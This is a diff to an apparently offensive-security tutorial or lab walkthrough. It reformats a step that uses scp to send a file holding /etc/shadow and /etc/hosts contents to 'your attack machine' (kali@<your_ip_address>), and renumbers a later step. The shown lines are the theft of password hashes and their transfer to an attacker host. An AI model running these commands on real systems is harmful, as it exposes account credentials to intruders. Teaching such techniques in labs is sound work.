@@ -277,10 +277,14 @@ cat /etc/hosts >> users.txt   # Append /etc/hosts to the same file
 NOTE: The `>>` operator ensures that the contents of `/etc/shadow` and `/etc/hosts` are appended to `users.txt`. **If you use** `>`, **the file will be overwritten.**
 
 2. Next, use `SCP` to securely copy the `users.txt` file to your attack machine:
-   `scp users.txt kali@<your_ip_address>:.`
+   
+```bash
+scp users.txt kali@<your_ip_address>:.
+```
+
 NOTE: Make sure to replace <your_ip_address> with the actual IP address of your attack machine, and specify the path where you want the file to be saved.
 
-3. On your attack machine, open a new terminal, navigate to your home folder, and check if the file has been transferred successfully:
+4. On your attack machine, open a new terminal, navigate to your home folder, and check if the file has been transferred successfully:
 
 ```bash
 cd ~
